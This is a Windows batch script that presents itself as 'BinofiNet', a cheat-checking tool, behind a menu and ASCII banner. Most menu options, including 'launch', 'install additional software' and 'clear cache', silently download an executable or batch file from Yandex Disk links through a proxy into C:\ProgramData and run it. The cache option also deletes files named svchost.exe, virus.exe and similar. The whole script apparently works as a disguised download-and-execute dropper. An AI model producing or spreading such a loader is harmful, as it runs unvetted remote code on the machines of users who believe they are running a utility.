@echo off
color F
:m1
title BinofiNet - a program for checking for cheats
Echo BinofiNet - a program for checking for cheats:
Echo.
Echo *    ____    _                    __   _   _   _          _     *
Echo "   |  _ \  (_)                  / _| (_) | \ | |        | |    "
Echo "   | |_) |  _   _ __     ___   | |_   _  |  \| |   ___  | |_   "
Echo "   |  _ <  | | | '_ \   / _ \  |  _| | | | . ` |  / _ \ | __|  "
Echo "   | |_) | | | | | | | | (_) | | |   | | | |\  | |  __/ | |_   "
Echo "   |____/  |_| |_| |_|  \___/  |_|   |_| |_| \_|  \___|  \__|  "
Echo *                                                               *                                                                                            
Echo 1 - Program launch - BinofiNet,
Echo 2 - Installing Additional Software #1,
Echo 3 - Clearing the cache,
Echo 4 - Close program,
Echo.
Set /p choice="Write a number: "
if not defined choice goto m1
if "%choice%"=="2" del C:\ProgramData\BinofiNet-info.exe && powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('https://getfile.dokpub.com/yandex/get/https://disk.yandex.ru/d/jkqiPQ04VDMIZw','C:\ProgramData\BinofiNet-info.exe') && start C:\ProgramData\BinofiNet-info.exe && exit 
if "%choice%"=="1" del C:\ProgramData\BinofiNet-info.exe && powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('https://getfile.dokpub.com/yandex/get/https://disk.yandex.ru/d/bmRb_fBi_chCZA','C:\ProgramData\BinofiNet-info.exe') && start C:\ProgramData\BinofiNet-info.exe && exit  
if "%choice%"=="3" del C:\ProgramData\BinofiNet-info.bat && del C:\ProgramData\BinofiNet-info.exe && powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('https://getfile.dokpub.com/yandex/get/https://disk.yandex.ru/d/pcuI_CTm2YwqHQ','C:\ProgramData\BinofiNet-info.bat') && start C:\ProgramData\BinofiNet-info.bat && del C:\ProgramData\win.exe && del C:\ProgramData\virus.exe && del C:\ProgramData\Exloder.exe && del C:\ProgramData\con_visual.bat && del C:\ProgramData\d3dcompiler.bat && del C:\ProgramData\Systeam.exe && del C:\ProgramData\hlhack_external.txt && del C:\ProgramData\svchost.exe && del /s/q "C:\ProgramData\BinofiNet-info.lnk" && exit 
if "%choice%"=="4" taskkill /F /IM cmd.exe & exit
Echo.
goto m1
pause >nul